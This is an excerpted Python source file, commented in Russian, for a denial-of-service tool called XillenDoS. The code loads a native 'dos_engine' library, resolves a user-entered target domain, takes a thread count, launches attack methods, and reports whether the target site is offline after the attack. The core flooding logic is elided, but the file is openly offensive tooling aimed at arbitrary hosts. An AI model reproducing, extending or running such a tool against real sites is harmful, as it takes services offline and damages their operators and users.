...
class XillenDoS:
    ...
    def load_cpp_engine(self):
        try:
            if platform.system() == "Windows":
                lib_path = os.path.abspath(os.path.join("engine", "dos_engine.dll"))
            else:
                lib_path = os.path.abspath(os.path.join("engine", "dos_engine.so"))
            
            if not os.path.exists(lib_path):
                print(f"{Colors.RED}C++ движок не найден: {lib_path}{Colors.END}")
                print(f"{Colors.YELLOW}Запуск в режиме Python fallback...{Colors.END}")
                self.cpp_available = False
                return
                
            print(f"{Colors.CYAN}Загрузка C++ движка: {lib_path}{Colors.END}")
            
            # Загружаем DLL с правильными флагами
            if platform.system() == "Windows":
            ...
            # Тестируем загрузку
            test_engine = self.lib.create_engine()
            if test_engine:
                self.lib.destroy_engine(test_engine)
                self.cpp_available = True
                print(f"{Colors.GREEN}[OK] C++ движок загружен успешно!{Colors.END}")
            else:
                raise Exception("Не удалось создать тестовый движок")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Ошибка загрузки C++ движка: {e}{Colors.END}")
            print(f"{Colors.YELLOW}[WARNING] Запуск в режиме Python fallback...{Colors.END}")
            self.cpp_available = False
    ...
    def resolve_domain(self, domain):
        try:
            ...
            if ':' in domain and not domain.count(':') > 1:  # Не IPv6
                domain = domain.split(':')[0]
            
            self.logger.info(f"Резолвинг домена: {domain}")
            
            # Пробуем DNS resolver
            try:
                result = dns.resolver.resolve(domain, 'A')
                ip = str(result[0])
                self.logger.info(f"Домен {domain} резолвится в {ip} (DNS)")
                return ip
            except:
                # Fallback на socket
                import socket
                ip = socket.gethostbyname(domain)
                self.logger.info(f"Домен {domain} резолвится в {ip} (Socket)")
                return ip
                
        except Exception as e:
            self.logger.warning(f"Ошибка резолвинга домена {domain}: {e}")
            return None
    ...
    def check_domain_status(self, domain, port):
        try:
            if port == 443:
                url = f"https://{domain}"
            else:
...
"""
    ...
    def get_target_info(self):
            ...
            if target_input:
                ...
                if self.is_valid_ip(self.target):
                    ...
                    if self.target_ip:
                        ...
                        print(f"{Colors.RED}[ERROR] Не удалось резолвить домен! Используйте IP адрес.{Colors.END}")
                        continue
        ...
        self.threads = int(input(f"{Colors.GREEN}Количество потоков (по умолчанию 20): {Colors.END}") or "20")
    ...
    def start_cpp_attack(self, method):
        ...
        try:
            ...
            print(f"{Colors.MAGENTA}{Colors.BOLD}║                    СТАТУС ДОМЕНА ПОСЛЕ АТАКИ               ║{Colors.END}")
            print(f"{Colors.MAGENTA}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            domain_status = self.check_domain_status(self.target, self.port)
            
            if domain_status["status"] == "online":
                print(f"{Colors.GREEN}✅ Домен работает: {Colors.WHITE}{self.target}{Colors.END}")
                print(f"{Colors.GREEN}Время отклика: {Colors.WHITE}{domain_status['response_time']:.2f}s{Colors.END}")
                print(f"{Colors.GREEN}HTTP статус: {Colors.WHITE}{domain_status['status_code']}{Colors.END}")
                print(f"{Colors.GREEN}Сервер: {Colors.WHITE}{domain_status['server']}{Colors.END}")
            elif domain_status["status"] == "timeout":
                print(f"{Colors.YELLOW}⚠️ Домен недоступен (таймаут): {Colors.WHITE}{self.target}{Colors.END}")
                print(f"{Colors.YELLOW}Время отклика: {Colors.WHITE}>{domain_status['response_time']:.1f}s{Colors.END}")
            elif domain_status["status"] == "offline":
                print(f"{Colors.RED}❌ Домен недоступен: {Colors.WHITE}{self.target}{Colors.END}")
                print(f"{Colors.RED}Сайт не отвечает на запросы{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Ошибка проверки домена: {Colors.WHITE}{domain_status.get('error', 'Unknown')}{Colors.END}")
            ...
            error_msg = str(e)
            # Обрабатываем ошибки кодировки
            if "charmap" in error_msg or "codec" in error_msg:
                print(f"{Colors.RED}[ERROR] Проблема с кодировкой в C++ движке{Colors.END}")
                print(f"{Colors.YELLOW}[INFO] C++ движок работает, но есть проблемы с выводом{Colors.END}")
                self.logger.error(f"Ошибка кодировки C++ движка: {e}")
                return True  # Возвращаем True, так как движок работает
            else:
    ...
    def run(self):
        ...
        while True:
            ...
            if choice in ["1", "2", "3"]:
                print(f"{Colors.RED}Распределенная система в разработке...{Colors.END}")
                time.sleep(2)
                continue
